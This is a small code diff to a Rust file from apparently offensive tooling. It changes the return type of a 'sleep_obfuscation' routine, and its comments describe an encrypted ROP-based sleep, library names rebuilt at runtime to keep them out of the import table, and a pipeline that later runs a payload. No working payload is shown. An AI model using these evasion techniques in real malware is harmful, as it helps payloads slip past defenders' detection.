@@ -248,7 +248,7 @@ fn rop_context(
 ///
 /// This is the demo form (timing option C): it performs one encrypted sleep
 /// and returns, then the Execution technique runs the payload normally.
-pub fn sleep_obfuscation() -> Result<(), SleepObfuscationError> {
+pub fn sleep_obfuscation() -> Result<bool, SleepObfuscationError> {
     // 1. Resolve the libraries and every dynamic entry point. Names are
     //    runtime-rebuilt strings, so none of them reaches the import table.
     let kernel32_name = std::ffi::CString::new($KERNEL32_DLL_DEF$)
@@ -544,7 +544,9 @@ pub fn sleep_obfuscation() -> Result<(), SleepObfuscationError> {
         }
     }
 
-    Ok(())
+    // A Preparation always continues the pipeline; only the `bouncer` gate
+    // decides to abort (see `techniques/README.md`).
+    Ok(true)
 }
 
 /// Walks `[base, base + size)` with `VirtualQuery` and returns every committed
